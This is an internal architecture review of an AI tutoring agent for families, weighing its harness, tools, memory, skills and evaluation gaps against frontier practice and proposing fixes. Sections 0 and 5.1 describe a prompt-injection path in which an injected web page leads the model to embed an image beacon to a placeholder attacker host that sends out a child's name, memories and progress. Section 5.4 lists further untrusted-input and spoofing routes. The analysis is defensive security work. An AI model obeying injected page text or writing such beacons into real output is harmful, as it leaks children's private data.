# Agent frontier review · Homa's agent architecture vs the state of the art

> Status: research document, 2026-07-13, revision 2 (post-council). Method:
> six parallel read-only investigations of this repository (harness, tools,
> channels, memory, prompts and guards, product surface), a full read of the
> research wiki at `~/Documents/Projects/Sidney/research` (10 confirmed
> patterns, 13 artifact and concept deep dives), same-day web research on the
> July 2026 frontier (eve upstream 0.23.0 changelog, Anthropic context
> primitives, the harness-engineering literature), and a five-reviewer
> council (skeptical architect, fat-skills practitioner, security and
> child-data red team, bootstrapped-founder realist, evals engineer) whose
> verdicts are folded in throughout and recorded in section 9. Every claim
> about this repository cites a file; repository claims do not prove
> production behavior, per BUILD.md. This document proposes; founder rulings
> and the PRD still own policy.
>
> Recommendations are numbered F1 to F12 (F for frontier) on purpose: the
> season simulation field study
> (`plans/2026-07-13-season-simulation-field-study.md`) already owns R1 to
> R17, those are the product's known bugs, and this document is the second
> queue behind them, never beside them (section 6 preamble). Companions:
> `15-agentic-architecture.md` (placement rulings),
> `06-harness-gap-analysis.md` (the 07-02 Hermes comparison this supersedes
> in spirit), `eve-churn-log.md` (upgrade history), the season sim (the field
> evidence this document leans on).

## 0. Executive summary

Homa's agent architecture is, on the structural axes, at or ahead of the
frontier this research corpus describes: one framework-owned durable harness,
fat markdown instructions and skills over thin typed tools, a per-turn
rebuilt context block instead of trusted session history, tenancy as law with
a CI guard, and a production self-improving skill-save loop (the HWT
letter-tracing save in the season sim is the corpus's only multi-tenant,
injection-scanned, end-user-facing instance of the "skillify" loop's save
half).

The gaps are almost all on the **verification axis**, plus one **security**
finding the council surfaced that outranks everything else here. Ordered by
cost of leaving unaddressed:

1. **A confirmed server-side exfiltration channel.** `create_printable`
   accepts model-authored HTML gated only against `<script>/<iframe>/
   <object>/<embed>` and `javascript:` (`lib/materials/page-shell.ts:20`),
   then renders it with headless Chromium *inside the Vercel app runtime*
   (not the deny-all sandbox) with subresource loading on and no request
   interception (`lib/materials/render-page.ts:46-54,102-105`). A
   prompt-injected model, fed raw Firecrawl markdown via `web_fetch`, can
   embed `<img src="https://attacker/x?d=<child name + memories + progress>">`
   and the render beacons that data out. This is reachable from the exact
   surface the injection discussion analyzes, and it lands children's data.
   F11 closes it and it is the cheapest high-severity fix in the document.
2. **No behavioral eval harness.** eve ships evals as a first-class primitive
   (`defineEval`, LLM judges, CI exit codes); this repo has no
   `evals/*.eval.ts` files (three standalone `eval:*` scripts exist and run
   nothing in CI). The only end-to-end behavioral evidence is one manual
   season simulation. The frontier's strongest cross-creator pattern
   (evidence-gated completion) is absent at both grains: the agent
   self-declares done, and we self-declare the agent done.
3. **Background work makes promises no machinery backs.** The A-to-Z failure
   (BUG-P8-1) is a missing completion contract. The task tables already carry
   `summary`, `artifacts`, and `delivered_channel`
   (`20260711030000_homa_tasks_framework.sql`); what is missing is the
   contract tying them to a defined outcome and a blocked-stop, which is F2's
   job.
4. **The built-in `agent` subagent tool is live and ungoverned.** eve ships
   an `agent` tool by default at `maxSubagentDepth` 3; it inherits all 35
   tools, connections, instructions, and family auth, and shares the parent
   sandbox (`node_modules/eve/docs/subagents.mdx:8-23,80-93`). Homa sets no
   sentinel, no depth cap, and no governing instruction. Tenancy holds, but
   the model can fan out full-privilege copies of itself with unbounded,
   unobserved cost and behavior. This is a real gap, not the "no subagents"
   the earlier draft claimed.
5. **eve 0.19.0 is four minor versions behind an upstream moving weekly.**
   The lag was correct when set (the 0.18.2 to 0.19.0 replay corruption, per
   `eve-churn-log.md`), and the scripted upgrade gate is genuinely
   ahead-of-field discipline. The priced decision now is real: a prompt-cache
   fix, per-session durable sandboxes, dynamic model selection, token-limit
   HITL continuation, subagent cost attribution, and Agent Runs observability
   all live on the far side. But the jump's true prerequisite is session
   rotation (M1-15, unbuilt), and its dollar payback at current fleet size is
   small; the honest case for jumping is compounding risk, not cost (F3).
6. **One model, one privilege level, one context.** No model mix (compaction
   runs on Sonnet 5 too; the `agent.ts` comment claiming otherwise is
   aspirational), and untrusted web content flows into the same context that
   holds the family and every tool. The corpus's "single best idea to steal"
   (trust-tiered privilege separation) is expressible in eve but, per the
   architect, only if authored closed (F4).
7. **The skill system is a production save-loop with hobby rigor.** No skill
   has an eval, routing has no fixtures beyond the advertisement-targeting
   check, runtime skills have no versioning or provenance, and a resolver
   failure silently drops all skills for a turn
   (`agent/skills/skill-library.ts:51-54`).

The recommendations (section 6) are ordered accordingly, and section 6 opens
by subordinating the whole document to the season sim's still-open P0 bugs
(two verified live in the working tree tonight). Section 7 lists paths that
deserve a deliberate alternatives check. Section 8 lists what to protect.
Section 9 records the council round in full.

## 1. Sources and how to read this

- **This repository**, via six parallel read-only investigations on
  2026-07-13, then five council reviews that re-verified load-bearing claims
  against the code. File citations throughout.
- **The research wiki** (`~/Documents/Projects/Sidney/research`): a curated,
  citation-disciplined catalog of frontier agent artifacts and the patterns
  extracted from them. Referenced as `[[wiki:page-name]]`.
- **Same-day web research**: vercel/eve CHANGELOG through 0.23.0, Vercel
  Agent Runs changelogs, Anthropic context-management docs (memory tool,
  context editing, server-side compaction), and the 2026 harness-engineering
  literature (Hashimoto; Böckeler's guides-and-sensors frame; the ratchet
  principle; Glean's production harness writeup).
- **Field evidence**: the season simulation, treated as our one existing
  end-to-end behavioral eval.

Terms, defined once:

- **Harness**: everything around the model that makes it an agent (loop,
  tools, context assembly, memory, permissions, observability).
- **Guides vs sensors** (Böckeler): guides steer before the model acts
  (instructions, tool descriptions); sensors verify after (tests, evals,
  hooks). Field finding: guides hold roughly 70 percent of the time, sensors
  enforce at 100, and most teams over-invest in guides.
- **Evidence-gated completion**: done is checked against an external surface,
  not model confidence; budget exhaustion is not done.
- **Skill-pack bundle**: a skill ships with tests, including a *resolver
  eval* (does it fire when it should and stay quiet when it should not).
- **Latent vs deterministic**: every step is model judgment or
  same-in-same-out; the most common agent bug is putting a step on the wrong
  side.

## 2. How Homa's agent actually works today

Condensed from the code; the council verified §2 claim by claim and nearly
all held (down to the 2,733-line isolation guard). Corrections from that pass
are inline.

### 2.1 Harness

eve 0.19.0, pinned exact, pnpm-patched (`patches/eve@0.19.0.patch`, an iOS
stream-disconnect classifier fix applied to minified `dist` output).
Integrated via `withEve()` in `apps/web/next.config.ts`. One `defineAgent`
(`agent/agent.ts`): `anthropic/claude-sonnet-5` through the Vercel AI
Gateway, `compaction.thresholdPercent: 0.75`. Note: `agent.ts` sets *only*
the threshold; compaction runs on the active turn model (Sonnet 5) per eve's
default (`node_modules/eve/docs/concepts/default-harness.md`), and it is
unmetered (`record-usage.ts` documents that gap). The in-file comment
claiming a cheaper compaction model is aspirational, not configured. Durable
sessions ride Vercel Workflow (already on the `@workflow/core` 5.0.0-beta
line at 0.19); Homa treats them as execution state only. The resume API is
wrapped (`lib/harness/resume-session.ts`) because a synchronous `ok: true`
proved untrustworthy during the 0.18.2 to 0.19.0 corruption incident.

### 2.2 Context assembly (the pinned-context doctrine)

The system prompt is composed per turn:

1. `agent/instructions.md`, the soul file, 418 lines: persona, voice law, a
   tool routing table, progress and memory law, materials workflow. (A 17-line
   editor-facing HTML comment sits at the top; whether eve strips it from the
   model-facing prompt is unverified and worth checking.)
2. `agent/instructions/family-context.ts` on `turn.started`: family roster,
   map snapshot, curated memories, live progress, continuity block, rebuilt
   from Postgres every turn. Family JSON capped at 16,000 chars. A flight
   recorder snapshots what each turn carried (`lib/observability/agent-trace.ts`).
3. Channel mode blocks: `sms-mode.ts` (about 221 lines, Telnyx only, and it
   already carries the signup, invite, and heads-up-first law),
   `email-mode.ts`, `research-mode.ts`.
4. Skill advertisements: `agent/skills/skill-library.ts` merges `family_skills`
   and `skill_bank` rows, age-and-tag targeted, family-over-bank precedence.
5. Continuity markdown from the episode ledger when the channel resolved one.

Nothing load-bearing lives in eve session history; compaction and rotation
are safe by construction. This is the strongest single decision in the
architecture and it matches what the compaction research and Anthropic's own
context-engineering guidance converged on. It is also, per the architect, the
strongest de-risking lever for the eve jump (section 5.3): rotate rather than
replay.

### 2.3 Tools

35 active authored tools plus two `disableTool()` sentinels (`bash`,
`write_file`), and framework built-ins. Among the built-ins, `web_search`,
`load_skill`, `read_file`/`glob`/`grep`, `todo`, and `ask_question` are in
use; `web_fetch` is replaced by an authored Firecrawl tool. The built-in
`agent` (subagent) tool is **live and ungoverned**: no sentinel, no
`maxSubagentDepth` override (eve default 3), no instruction; the model can
delegate full-privilege copies of itself sharing the sandbox and all tools
(§0 point 4). Every authored tool resolves tenancy through one seam,
`resolveAgentAccess()` in `lib/agent-db.ts`: caller JWT plus RLS on web,
channel-authenticated pinned familyId on SMS, email, dispatch. Model-supplied
IDs are re-verified inside the family everywhere they appear.

### 2.4 Skills

Two homes, per the 15-agentic-architecture ruling: repo skills
(`agent/skills/materials-studio/SKILL.md` at about 318 lines, plus
`research-brief`) versioned with deploys, and runtime skills (`family_skills`
and `skill_bank` rows) served dynamically. The save path (`save_skill`) is
the skillify loop's *save half* in production: the season sim watched a
parent complaint become a permanent per-family HWT tracing skill in 44
seconds. It writes name, routing-hint description, and markdown with an
injection scan and a 20-row cap, and stops there: no fixture, no eval, no
version history, no provenance (the corpus's tested-bundle loop is steps 1
through 10; Homa ships step 1). Failure posture: any resolver error means
skills are absent for that turn, silently.

### 2.5 Channels and continuity

Five adapters into one agent: web (`channels/eve.ts`), SMS Telnyx
(`channels/telnyx.ts`), email Resend (`channels/email.ts`, live now, not
"eventual"), dispatch (proactive task runs), research (fleet, no family). A
separate Telnyx voice assistant shares guarded libraries but not the eve
loop. Underneath sits the conversation-continuity ledger:
`conversation_episodes`, `_messages`, `_deliveries`, `_open_loops`,
`_thread_bindings`, with reply causation rules that never guess "latest,"
per-adult chat privacy, and cross-channel reply resolution. `pnpm
check:continuity` covers it. Known harness limit the earlier draft missed:
eve keeps no durable inbound message queue (one turn at a time per session,
bursts drained best-effort), and the per-family send queue is an unresolved
spike (`01-architecture.md`); `channels/telnyx.ts` has no queueing today.

### 2.6 Memory

Layered: a pinned curated set (`family_memories`, 4,000-char budget,
injection-scanned via `scanMemoryContent`, superseded-not-deleted), a
searchable archive (recall over FTS plus pgvector), and extraction loops
(post-call, post-chat review). Field evidence: the standalone extractor ran
four times in the season sim and saved zero; all durable memories came from
the in-turn `remember` tool.

### 2.7 Background work

One authored dispatcher schedule (`agent/schedules/dispatch.ts`, hourly)
leases up to 50 due rows from `agent_schedules` per tick, wakes the agent per
family through the dispatch channel, with an at-least-once outbox
(`homa_task_runs`, which already has `summary`, `artifacts`,
`delivered_channel`), delivery windows, and a reaper. A nightly fleet-research
schedule fills `knowledge_bank`. Parents can create custom tasks by asking.
There are no *declared* subagents (`agent/subagents/` is absent), though the
built-in `agent` tool is live (§2.3). A turn's work dies with the turn: the
A-to-Z incident (BUG-P8-1) had the agent promise "I'll let you know when it's
ready" with nothing behind it. Two ceilings the earlier draft missed: the
50-lease-per-hour dispatcher cap skips timezone-clustered morning briefs past
a few hundred families, and Workflow runs cap at 25,000 events with rotation
(M1-15) unbuilt.

### 2.8 Guards, safety, observability

Seven-plus CI guards as sensors: `check:isolation` (live cross-tenant smoke,
2,733 lines, exercises the anonymous and authenticated-member RLS paths, *not*
the pinned server-query path), `check:map`, `check:events`,
`check:skills-targeting`, `check:taxonomy`, `check:continuity`,
`check:agent-context`, plus the ChildProgress suites and a disposable
Postgres E2E. Code-enforced safety where it matters most: memory injection
scans (a 7-pattern English denylist plus invisible-char check, a floor not a
wall), consent classified by regex not model judgment
(`classifyFamilySmsInviteConsent`), progress evidence quoted from trusted
channel context, JSON-serialized family data labeled data-not-instructions.
Instruction-only safety where the frontier is also instruction-only: distress
handling, web-page content discipline, and the D5 distress-data firewall
(one instruction line plus model judgment, while the founder console reads
`conversation_messages` raw). Observability is Postgres-first: `model_usage`
per step, `agent_tool_calls`, per-turn context snapshots, an admin session
x-ray. No OTel export, no Langfuse, compaction spend unmetered, Agent Runs
unverified.

### 2.9 What we deliberately do not do

Framework `bash` and `write_file` disabled by sentinel (founder ruling
2026-07-09). Sandbox egress deny-all in production, `just-bash` locally.
`web_fetch` re-enabled 2026-07-13 as an authored Firecrawl tool with the
injection risk explicitly accepted ahead of M2-14. No MCP connections. No
declared subagents. No evals. eve pinned exact with a scripted upgrade gate
(`scripts/eve-upgrade-check.mjs`) and a runbook. Note the deny-all sandbox
does *not* cover the app-runtime egress used by the Chromium render,
Firecrawl, SerpAPI, `keep_photo`, and `generate_image`; that egress is open
(§0 point 1, F11).

## 3. The frontier, as the corpus and the field describe it

### 3.1 The architecture consensus

The wiki's central structural pattern ([[wiki:thin-harness-fat-skills]])
held "proposed" for a month because no one had ingested an actual harness;
ingesting eve answered its open question with a split verdict (the page still
holds proposed and expects a reframe): production harnesses are not thin
(~200 lines), they are **framework-owned and generic**, and the durable rule
is the three-layer split (judgment up in editable markdown, exact work down
in deterministic code, a generic loop in the middle you do not write). Five
creators converge on the fat-skills half. The named anti-pattern is the fat
harness: 40-plus tool definitions eating context, god tools, an MCP
round-trip per REST endpoint, measured as "3x tokens, 3x latency, 3x failure
rate." Homa is a healthy instance of the split, with the soul-file salience
watch item in section 5.6.

### 3.2 The behavioral consensus

- **Evidence-gated completion** ([[wiki:evidence-gated-completion]],
  confirmed across OpenAI, Forward Future, Vercel): the stop decision moves
  off model confidence onto an assertable surface; budget exhaustion is a
  blocked-and-summarize event; blocked is first-class. OpenAI's six-element
  completion contract is the reusable spec shape
  ([[wiki:completion-contract]]).
- **Latent vs deterministic split** ([[wiki:latent-vs-deterministic-split]],
  confirmed). Homa's scorer, consent regexes, and journal matcher are clean
  applications.
- **Persona-lens review panels** ([[wiki:persona-lens-review-panel]],
  confirmed, three creators): fan a high-stakes artifact to narrow read-only
  reviewers with a fixed output contract, merge deterministically. Homa's
  copy-reviewer-then-editor gates and this document's own section 9 council
  are true instances; the materials vision review is the two-role
  generator-verifier *cousin* the wiki tracks separately.
- **Anthropic's dynamic workflows** ([[wiki:dynamic-workflows]]): named
  failure modes it defeats: agentic laziness, self-preferential bias, goal
  drift. The quarantine variant (agents reading untrusted content are barred
  from privileged actions) is the structural answer to prompt injection.

### 3.3 The quality consensus

- **Skill-pack bundle** ([[wiki:skill-pack-bundle]], confirmed): the rarest,
  most valuable part is the **resolver eval**. Counter-bet: mattpocock-skills,
  135K stars, zero tests, betting radical smallness. Both sides agree prose
  behavior drifts silently without something pinning it.
- **Complexity ratchet** ([[wiki:complexity-ratchet]], confirmed): every
  session deposits tests, docs, eval thresholds; the floor only rises. The
  boundary: contract tests are the ratchet, distrust scaffolding is a cage.
- **Resolver routing tables** ([[wiki:resolver-routing-table]], confirmed):
  past roughly 40 skills, description auto-matching mis-fires; an explicit,
  *tested* routing table with adversarial negatives and a reachability audit
  keeps skills from going dark. Four non-Garry creators build the table; none
  test it. Testing routing is an open differentiator.

### 3.4 Harness engineering as a discipline (2026)

The field named the job this year: Agent = Model + Harness (Hashimoto), and
the harness matters more than the model on the benchmarks that have measured
it (a 22-point SWE-bench swing from the harness vs 1 point from the model).
The canonical frame is **guides vs sensors**, with the repeated finding that
teams over-invest in markdown guides and under-invest in automated sensors.
The ratchet principle (every agent mistake becomes a permanent harness fix;
zero aspirational rules, every line traces to a real failure) is the working
method. Glean's production harness is instructive: a minimal core toolset
plus **search-and-progressive-disclosure** over hundreds of tools, with
results appended to the *end* of the conversation to preserve the prompt
prefix cache. That last move is directly relevant to Homa (section 5.6).

### 3.5 Since the wiki's June 20 cutoff

- **eve moved from 0.11.x to 0.23.0.** Homa pinned 0.19.0. Relevant landings
  after 0.19 (full list in Appendix A): an Anthropic prompt-cache breakpoint
  fix (0.22.2); session sandboxes keyed per durable session so redeploys stop
  orphaning `/workspace` (0.22.1, which retires the "every deploy orphans the
  sandbox" assumption in `01-architecture.md`); scoped dynamic model
  selection per session, turn, or step (0.22.0); session token limits that
  pause into a HITL continue-or-stop prompt (0.21.0); subagent token usage
  reported to the parent with OTel spans (0.21.0); invalid tool input returned
  to the model instead of thrown (0.22.0); mounted extensions; hardened
  frontmatter parsing.
- **Agent Runs** shipped for eve projects on Vercel: traces auto-ingested,
  inspectable from CLI and MCP (July 3), with a subagent tab (July 13).
- **Anthropic shipped first-party context primitives**: a client-side memory
  tool, context editing (server-side clearing of stale tool results), and
  server-side compaction.
- **Codex Goals** are the productized completion contract; Agent Skills is a
  formal open standard.

## 4. Scorecard: the frontier patterns against this repository

| Frontier pattern (wiki status) | Homa status | Evidence |
|---|---|---|
| Framework-owned harness, fat instructions, thin tools | **Strong** | eve + `instructions.md` + 35 typed tools |
| Pinned working memory outside compactable history | **Strong, ahead** | `family-context.ts` on `turn.started` |
| Latent vs deterministic split | **Strong** | scorer, consent regexes, journal matcher, review gate |
| Tenancy as law, not instruction | **Strong on caller path; asterisked** | RLS + JWT + `check:isolation` on web; pinned channels (SMS/email/dispatch) are code-scoped over an RLS-bypassing `mapDb()` connection the guard does not exercise; SMS entry auth is a spoofable sender number (M1-02 pending) |
| Consumer-side harness upgrade gate (novel; propose to wiki) | **Strong, novel** | exact pin + `eve-upgrade-check.mjs` + runbook + churn log (this is not the publisher-side version-as-update-gate pattern; §8.4) |
| Complexity ratchet (sensors accrue) | **Partial** | code and docs ratchet; agent *behavior* has no accruing eval floor |
| Skillify loop | **Save half strong, ahead in reach; bundle absent** | `save_skill` + season-sim HWT save; no fixture/eval/version/provenance |
| Skill-pack bundle (skills ship with tests) | **Missing** | zero evals; `check:skills-targeting` covers advertisement only |
| Resolver routing table, tested | **Partial, untested for routing** | description-as-resolver + targeted ads; no routing fixtures; silent resolver failure |
| Evidence-gated completion | **Missing** | agent self-declares done |
| Completion contracts for long work | **Missing the contract, has the slots** | `homa_task_runs` has summary/artifacts/delivered_channel; no outcome/verification/blocked binding |
| Persona-lens review panel | **Present at build grain** | copy-reviewer/editor gates, the §9 council; materials review is the generator-verifier cousin |
| Trust-tiered privilege separation | **Missing** | `web_fetch` content enters the privileged context; render path egresses freely |
| Subagents and model mix | **Built-in `agent` live but ungoverned; no model mix** | eve default `agent` tool at depth 3, no sentinel; compaction on Sonnet 5 |
| Evals as CI sensors for behavior | **Missing** | no `evals/`; three `eval:*` scripts unwired; season sim manual |
| Observability: traces, cost attribution | **Partial** | Postgres ledgers strong; Agent Runs unverified; compaction unmetered; no OTel |
| Memory: pinned + searchable + extraction | **Strong design, weak loop** | extractor saved 0 in field study |
| Progressive disclosure over growing surface | **Adequate today, watch** | 35 tools under the pain threshold; atlas and bank will push it |
| Ubiquitous language for agents | **Partial** | AGENTS/BUILD for engineering; no product-domain glossary |

## 5. Gap analysis: what they do that we do not

Ordered by expected cost of leaving it unaddressed.

### 5.1 The exfiltration channel (highest severity, cheapest fix)

Confirmed in code and verified independently. `create_printable` inserts
model-authored HTML "as-is" (`lib/materials/page-shell.ts:89`) behind a gate
that blocks only `<script>/<iframe>/<object>/<embed>` and `javascript:`
(`:20,35-40`). Everything else, `<img src>`, `<link rel=stylesheet>`, CSS
`url(...)`, `@import`, `srcset` to any host, passes. `renderPrintableHtml`
runs `@sparticuz/chromium` inside the Vercel function when `process.env.VERCEL`
is set (`lib/materials/render-page.ts:46-54`) and calls
`page.setContent(html, { waitUntil: "load" })` (`:102-105`), which by design
fetches every subresource, with no `setRequestInterception` and no host
allowlist. Because `web_fetch` returns raw Firecrawl markdown to the model
(`agent/tools/web_fetch.ts`; `lib/search/firecrawl.ts` does size and status
checks only, no scan), an injected page can instruct the model to compose a
worksheet whose `<img src>` beacons family data out at render time, from the
privileged app runtime. Quarantining the reader (F4) does not close this: the
leak is at render time in the main loop, not at read time. F11 is the fix and
it is small.

### 5.2 The verification gap (largest by breadth)

eve ships `defineEval` against the real HTTP surface with deterministic
checks and LLM judges, gate-vs-soft severity, and CI exit codes; this repo
has no eve-native eval files (three standalone model evals exist,
`eval:recall`, `eval:continuity`, `eval:research-brief`, and none run in CI).
The chat agent's behavior is guarded by unit tests on context assembly and
tool contracts (real sensors), the copy skills (procedural, human-gated), and
one manual season simulation whose driver scripts live under
`scripts/_tmp_season_sim/`. The soul file is 418 lines of guides; guides hold
about 70 percent of the time. Regressions the existing suite cannot catch,
each of which burned a real or simulated family: tool-routing drift (log_hours
stops firing on time mentions), voice-law decay after compaction, check-in
answer mistranslation, skill ad mis-targeting, distress-handling drift, SMS
mode leaking markdown. The season sim caught the launch-class bugs (18
numbered findings, BUG-P1-1 through BUG-P9-1) that unit tests missed, but it
is manual and ephemeral.

An honest caveat the evals councilor added: the sim's own conclusion is that
model quality was "strong to outstanding" and "almost every serious problem
was a persistence, delivery, or surfacing gap." So the highest-value sensors
for the next month are not behavioral judges; they are alarms on silent
delivery failures (F8) plus the sim's P0 fixes. The behavioral eval floor is
the right *second* month, and its cheapest layer (deterministic goldens and a
production voice-lint) is worth starting now.

### 5.3 The eve lag is a priced decision resting on an unbuilt prerequisite

Staying on 0.19.0 was correct when made. Three council corrections to the
earlier draft's framing:

1. **Cost.** The prompt-cache fix does not "pay for the project" at current
   scale. The sim measured 2.38M chat input tokens for one condensed
   family-season at 59 percent cache read; at a handful of families that is
   tens of dollars a month. Also, two technical caveats: the per-turn dynamic
   block (family, progress, continuity) changes the system prompt every turn,
   so the first call of each turn misses structurally regardless of
   breakpoints (ceiling roughly 65 to 70 percent, against 59 measured), and
   the sim's rapid-fire turns likely overstate production cache hits given
   Anthropic's short default cache TTL versus real parent reply gaps. Whether
   the upstream breakpoint fix even binds to Homa's gateway-auto caching path
   (string model id) rather than the anthropic-direct path is unverified.
   Before scheduling, price it from `model_usage`: decompose misses into
   turn-boundary (unfixable by breakpoints, addressed by 5.6) versus
   intra-turn (fixable). Justify the jump by the feature list, not the cache
   line.
2. **Prerequisite.** The runbook blocks a production bump until a
   parked-session inventory exists, and session rotation (which would let
   every family start on a fresh session at the deploy boundary and skip
   replay divergence entirely, per 2.2's own doctrine) is designed but
   unbuilt, owned by M1-15. M1-15 is the true first line of F3.
3. **Strategy.** One production jump, staged *local* drills: run
   `eve-upgrade-check.mjs` pairwise across each hop (0.19 to 0.20 to 0.21 and
   so on) plus the direct 0.19-to-0.23 pair to localize breaks, but make a
   single production boundary crossing, because every production version
   boundary is a replay hazard and staging in production quadruples the
   hazardous boundaries and the pnpm-patch re-port work.

What genuinely accumulated on the far side still matters: per-session
sandboxes, dynamic model selection (unblocks the never-built T2 model mix),
token-limit HITL, subagent usage attribution, and invalid-tool-input
self-correction. The risk compounds with every release absorbed and with
fleet growth, which is the real argument for going early-ish, while few
sessions exist to rotate and no families are mid-paid-trial.

### 5.4 Untrusted input, one privilege level, one context

The full untrusted-input surface (the earlier draft named only web content
and called email "eventual"):

1. `create_printable` render egress (5.1), highest severity, server-side, any
   family field.
2. SMS caller-ID spoofing: the sender number is the sole auth factor
   (`channels/telnyx.ts`), so spoofing impersonates a family and loads its
   children's data. Email at least gates legacy addresses on DMARC.
3. Pinned-path RLS bypass: SMS/email/dispatch query via `mapDb()`
   (RLS-bypassing) scoped only by application `where family_id`, and
   `check:isolation` does not exercise it (M1-02 pending).
4. Uploaded photos, PDFs, office docs, and their model-generated captions,
   which persist into `conversation_messages` and re-inject via recall
   (`lib/voice/sms-attachments.ts`); unscanned, live now.
5. Inbound email bodies and headers (`channels/email.ts`), live now.
6. `web_fetch` of TPT, curriculum, and parent-linked pages (the founder
   accepted this risk in the `web-fetch-firecrawl` ruling).
7. `search_photos` result titles and sources (low bandwidth).

Quarantine (F4) is the corpus's structural answer, but the architect's
finding reshapes it: an eve 0.19 declared subagent inherits *nothing* from
root (`node_modules/eve/docs/subagents.mdx:54-70`), so an absent tools slot,
sandbox, or hooks fall back to permissive framework defaults (shell on,
egress allow-all, no usage or persistence hooks). A naive quarantine subagent
would therefore *invert* the posture. It must be authored closed: its own
`tools/` with only Firecrawl `web_fetch` plus `disableTool()` sentinels, its
own deny-all `sandbox.ts`, its own copies of the usage and tool-call ledger
hooks, no family context at all (URL and markdown in, typed capped fields
out), and the parent must treat the returned summary as still-untrusted and
never concatenate it into an egress-capable sink. eve's own docs say it
plainly: "Do not rely on subagent delegation by itself as an approval
boundary." Quarantine is a complement to M2-14's content scanning, not a
substitute, and it gets materially cheaper after the eve jump (0.21 subagent
attribution removes the hook duplication).

Separately, model *mix*: compaction runs on Sonnet 5 (2.1); cheap-model work
is already routed off-loop (captions, review, extraction); the loop itself
has no routing, and eve 0.22.0's scoped dynamic model selection is the clean
mechanism once past the jump.

### 5.5 Skills: production save-loop, hobby rigor

Three deficits against the skill-pack-bundle bar, plus what the council added:

1. **No behavior evals.** A bank skill edit ships on vibes.
2. **No routing fixtures.** `check:skills-targeting` is already a
   polarity-balanced deterministic *advertisement* eval (15 checks, including
   adversarial negatives like "a letter skill skips a teens-only family"), so
   the harness stub exists; what is missing is per-skill *routing* fixtures
   (does a letter request load `hwt-letter-tracing`, and stay quiet on a math
   request) and the discipline that "intent must paraphrase the trigger, not
   copy it."
3. **Silent failure.** `skill-library.ts:51-54` swallows resolver errors into
   "skills absent this turn."
4. **No versioning or provenance.** `family_skills` has one row per name;
   upsert overwrites in place; no history, no link to the teaching
   conversation. Memories are superseded-not-deleted; skills are
   destroyed-on-edit. A bad "tweak that skill" turn eats the good version
   silently.
5. **No save-time fixture emission.** The actual skillify move is that the
   agent emits the bundle at save time; nothing does.
6. **No dark-skill or reachability audit.** A bank skill whose tags never
   match any family's vocabulary is an invisible surgeon.
7. **No family-over-bank shadow signal.** A bad family variant permanently
   shadows a curated bank skill with no ops signal.

The fat-skills councilor's framing: two homes, two rigor bars. The **bank**
(founder-published, shared, targeted) is production-maintained shared
capability and deserves the full bundle; **family rows** (parent-taught,
capped, single-tenant blast radius) are the smallness bet, where caps plus
scan plus a save-time fixture may be the whole appropriate discipline.

### 5.6 Context economics (salience, not dollars)

The earlier draft sold this as a cost lever; the council corrected it.
Post-cache-fix the stable soul file is the *cheapest* part of the context
(the cacheable prefix); the per-turn family, progress, and continuity block
is where the money is. The real reasons to shed procedure out of the 418-line
always-on file are salience and rot: an always-on rulebook dilutes
instruction pressure on the binding laws, and duplication drifts (the
`send_heads_up` law currently lives in four places: the soul-file routing
table, the soul-file Making-materials section, `sms-mode.ts`, and
materials-studio `SKILL.md`). 418 lines is a fine *number* (half of gstack's
own 962-line preamble); the target is duplication and the zero-aspirational-
rules provenance discipline. The genuinely movable sections (signup and invite
already live in `sms-mode.ts`, so they are not candidates): the check-in
translation law (~30 lines, inject via a *state-conditional* dynamic when a
check-in is active, not a `load_skill` hop you cannot trust mid-check-in), the
Making-materials detail (fold most into materials-studio, keep the routing row
and the offer-first and heads-up laws), and attachment-handling paragraphs
(inject when the turn carries an attachment).

The single biggest cache lever is independent of the eve version and comes
from Glean (3.4): move the per-turn family/progress/continuity block *out* of
the system prompt and into a per-turn message-level block, so the static
prefix (soul file, tool defs) stays cacheable across turns. Worth prototyping
against `model_usage` before the jump.

### 5.7 Memory loop underperforms its design

Design is right (pinned + archive + extraction); the extraction half barely
fires (0 saves in 4 sim runs) and the observation ledger is a near-dead-letter.
Frontier upgrades: pm-os's canonical-log-to-recall-packet pipeline
(deterministic packet builders with a health enum), and diarization
([[wiki:diarization]]): a weekly per-kid compiled page (what changed, what
worked, contradictions held) built from observations and logs, which is the
same feature as the season sim's R10 per-kid journal, so build it once, under
that ticket, and contribute only the packet-builder shape from here.
Anthropic's memory tool is a watch item, not an adopt; our tool-mediated
Postgres memory is the same shape with better tenancy.

### 5.8 Observability and harness risks

Postgres ledgers are a solid floor. Missing: Agent Runs (now available for eve
projects; verify team access and wire the CLI into the ops runbook),
compaction spend metering, OTel export (M4-03), and a production behavioral
alarm (an SMS thread going silent after an outbound failure was invisible in
the sim until autopsy; the fix is a receipt-age alarm). Harness risks the
council surfaced that belong on the radar: the absent inbound message queue
(2.5), the 25,000-event Workflow cap with rotation unbuilt (2.7), the
dispatcher's 50-lease-per-hour ceiling (2.7), and the ungoverned built-in
`agent` tool (2.3).

## 6. Recommendations

Sized S (hours), M (a day or two), L (a week-class project), XL (a standing
program). **Nothing here starts before the season sim's P0 list (its R1
through R6b) is closed: those are days of work that remove the reasons a real
family churns in week one, and two of them are still open as of this revision,
the report narrative SQL (`lib/map/narrative-store.ts:76`) and web photo
upload (`lib/attachments/normalize-chat-attachments.ts:181`). This document is
the second queue, not the first.** The sim's roadmap uses R-numbers; this
document deliberately uses F-numbers to avoid conflation.

Also out of this document's scope but ahead of most of it in the founder's
real queue: the wall grandfather rule, wall flip, and portfolio export (sim
R11/R15), which are the next-four-weeks money work. F-items sequence after
that, except the S-sized items that ride along.

**First three, if only three happen before September:**

1. **F2a (S).** The instruction rule that closes BUG-P8-1's live trust wound:
   the agent never promises post-turn work; it does the first unit now and
   offers the rest, or calls `create_task` in the same turn and names the
   delivery time. Pairs with the background-work directions already in flight.
2. **F8 + F5-alarm (S).** Observability quick wins, above all the SMS
   receipt-age alarm, which converts the sim's scariest silent failure (a
   family's thread going dark) into a page, exactly when real families arrive;
   fold in the loud resolver-failure ops event (same "make silent failures
   loud" move).
3. **F11 (S to M).** The render-path egress boundary, because it is the one
   high-severity security hole in the document and the fix is small.

**F1. The eval floor, in four honest tiers.**
- **F1-tier0 (M).** Deterministic and free, per-PR in `check:*`: a voice-law
  lint on fixtures (no em dash, no markdown in SMS, banned openers, emoji
  caps, "behind" tripwires, all regex), the `sms-mode` block-injection test,
  per-skill *routing* fixtures extending `check:skills-targeting`, and wiring
  the orphaned `sms-segments.test.ts`. Several of these already exist and only
  need wiring.
- **F1-tier1 (M, then ongoing).** Live-model with deterministic assertions
  (eve `defineEval` with `calledTool`/`notCalledTool` gates: tool-routing
  goldens, check-in answer translation, materials reshow-not-rebuild). About
  $0.05 to $0.20 per case; run per-PR only on agent-surface diffs, full
